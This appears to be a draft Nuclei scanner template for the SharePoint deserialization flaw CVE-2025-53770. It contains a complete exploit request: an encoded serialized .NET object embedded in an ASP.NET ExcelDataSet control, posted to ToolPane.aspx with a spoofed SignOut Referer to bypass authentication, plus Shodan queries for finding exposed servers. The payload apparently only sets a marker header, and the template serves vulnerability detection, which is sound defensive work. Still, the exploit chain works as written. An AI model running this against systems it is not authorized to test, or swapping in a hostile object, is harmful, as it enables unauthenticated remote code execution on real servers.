id: CVE-2025-53770

info:
  name: Microsoft Sharepoint - Deserialization of Untrusted Data (DRAFT, UNVERIFIED!!)
  severity: critical
  author: darses
  description: |
    Deserialization of untrusted data in on-premises Microsoft SharePoint Server allows an unauthorized attacker to execute code over a network.
  impact: |
    Unauthorized attackers can execute arbitrary code remotely, potentially leading to full system compromise.
  reference:
    - https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770
    - https://research.eye.security/sharepoint-under-siege/
    - https://github.com/projectdiscovery/nuclei-templates/blob/1a50aaaa7c2d8a81ed19db7828b10bcd5d6c5b94/code/cves/2021/CVE-2021-3156.yaml
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-53770
    cwe-id: CWE-502
  metadata:
    vendor: microsoft
    product: sharepoint_server
    shodan-query:
      - http.component:"Microsoft SharePoint"
      - "MicrosoftSharePointTeamServices: "
      - "SPRequestGuid: "
      - "X-SharePointHealthScore: "
  tags: rce,microsoft,sharepoint,cve,cve2025,kev

variables:
  # In-memory .net object to set response header, copied from https://github.com/projectdiscovery/nuclei-templates/blob/1a50aaaa7c2d8a81ed19db7828b10bcd5d6c5b94/code/cves/2021/CVE-2021-3156.yaml
  # AddHeader("projectdiscovery", "project")
  payload: |
    <%@ Register Tagprefix="Scorecard" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
    <%@ Register Tagprefix="asp" Namespace="System.Web.UI" Assembly="System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" %>

    <asp:UpdateProgress ID="UpdateProgress1" DisplayAfter="10" runat="server" AssociatedUpdatePanelID="upTest"><ProgressTemplate><div class="divWaiting">
    <Scorecard:ExcelDataSet CompressedDataTable="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" DataTable-CaseSensitive="false" runat="server"></Scorecard:ExcelDataSet>
    </div></ProgressTemplate></asp:UpdateProgress>

http:
  - method: POST
    path:
      - "{{BaseURL}}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx"

    headers:
      Referer: "/_layouts/SignOut.aspx"
      User-Agent: "https://github.com/darses/nuclei-templates/blob/main/CVE-2025-53770.yaml"
      Content-Type: "application/x-www-form-urlencoded"

    body: |
      MSOTlPn_Uri={{url_encode(BaseURL+"/_controltemplates/15/AclEditor.ascx")}}&MSOTlPn_DWP={{url_encode(payload)}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "projectdiscovery: project"
          - "Microsoftsharepointteamservices"
        condition: or
